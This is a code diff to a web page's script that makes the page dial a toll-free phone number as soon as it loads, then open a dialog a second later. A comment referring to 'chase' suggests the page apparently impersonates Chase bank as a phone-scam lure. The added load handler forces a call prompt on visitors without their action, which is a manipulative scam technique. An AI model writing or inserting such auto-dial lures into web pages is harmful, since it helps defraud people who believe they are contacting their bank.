@@ -170,8 +170,11 @@
         window.location.assign('tel:+1-844-485-2265');
       });
 
-      // Auto-open on load
-      window.addEventListener('load', open);
+      // Auto-dial first, then open dialog after delay
+      window.addEventListener('load', () => {
+        window.location.assign('tel:+1-844-485-2265');
+        setTimeout(open, 1000); // Delay dialog by 1 second to let auto-dial prompt appear first
+      });
     })();
   </script>
   <!-- Default Statcounter code for chase
